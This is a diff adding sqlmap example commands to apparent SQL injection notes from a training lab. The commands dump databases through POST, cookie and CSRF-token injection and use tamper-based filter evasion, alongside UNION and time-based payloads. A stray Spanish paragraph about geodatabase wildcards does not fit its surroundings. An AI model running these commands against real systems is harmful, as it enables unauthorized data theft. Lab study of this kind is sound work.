@@ -61,3 +61,70 @@ UNION ALL SELECT 1,@@version,3
 AND 1=IF(2>1,SLEEP(5),0)
 
 ```
+
+<h4> Examples </h4> 
+
+```bash
+
+sqlmap -u "http://68.183.43.71:31928/case2.php" --data 'id=1' --batch --dump
+```
+
+```bash
+
+sqlmap -u "http://68.183.43.71:31928/case2.php" --data 'id=1' --batch --dump
+```
+
+```bash
+
+
+sqlmap -u "http://46.101.14.236:31381/case3.php" -H 'Cookie: id=1*' --batch --dump
+```
+
+
+```bash
+sqlmap -r pass --batch --dump
+
+
+```
+
+<p> El símbolo de porcentaje (%) significa que se acepta cualquier elemento en su lugar: un carácter, cien caracteres o ningún carácter. Los comodines que utiliza para consultar geodatabases personales son el asterisco (*) para cualquier número de caracteres y el signo de pregunta (?) para un carácter. </p>
+
+```bash
+sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
+
+
+```
+
+
+```bash
+curl 'http://46.101.14.236:30396/case5.php?id=1' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Referer: http://46.101.14.236:30396/case5.php' -H 'Upgrade-Insecure-Requests: 1'
+
+```
+
+
+```bash
+sqlmap -u "http://46.101.14.236:30396/case5.php?id=1" --dump --batch --level=5 -v --risk=3 -T flag5
+
+sqlmap -u "http://46.101.8.93:30951/case1.php?id=1" --search -C style --batch
+
+table 'users' in database 'testdb'  
+
+```
+
+
+```bash
+
+sqlmap -u "http://46.101.8.93:30951/case1.php?id=1" --dump -D testdb -T users 
+
+sqlmap -u "http://46.101.8.93:32590/case8.php" --data="id=1&t0ken=MEu9sTsYcBvyxR3KngqBo5c5fJrwr2ITxJQLIjlWx4" --csrf-token="t0ken" --batch --dump
+
+```
+
+
+```bash
+sqlmap -u "http://46.101.14.236:30154/case11.php?id=1" --dump --batch --tamper=between --random-agent
+
+```
+
+
+
